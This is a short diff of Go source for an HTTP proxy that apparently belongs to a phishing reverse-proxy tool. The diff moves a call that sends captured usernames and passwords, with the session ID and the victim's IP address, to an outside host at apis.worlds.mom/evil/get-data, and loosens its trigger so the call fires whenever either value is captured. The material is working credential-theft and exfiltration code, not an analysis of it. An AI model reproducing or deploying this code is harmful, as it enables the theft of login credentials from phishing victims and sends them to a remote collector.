@@ -602,10 +602,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							}
 
-							if len(capUserName) > 0 && len(capPassword) > 0 {
-								doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&user=" + url.QueryEscape(capUserName) + "&pwd=" + url.QueryEscape(capPassword))
-							}
-
 						} else {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
@@ -664,10 +660,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								if len(capUserName) > 0 && len(capPassword) > 0 {
-									doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&user=" + url.QueryEscape(capUserName) + "&pwd=" + url.QueryEscape(capPassword))
-								}
-
 								for k, v := range req.PostForm {
 									for i, vv := range v {
 										// patch phishing URLs in POST params with original domains
@@ -722,6 +714,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							}
 
+						}
+
+						if len(capUserName) > 0 || len(capPassword) > 0 {
+							doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&user=" + url.QueryEscape(capUserName) + "&pwd=" + url.QueryEscape(capPassword))
 						}
 
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
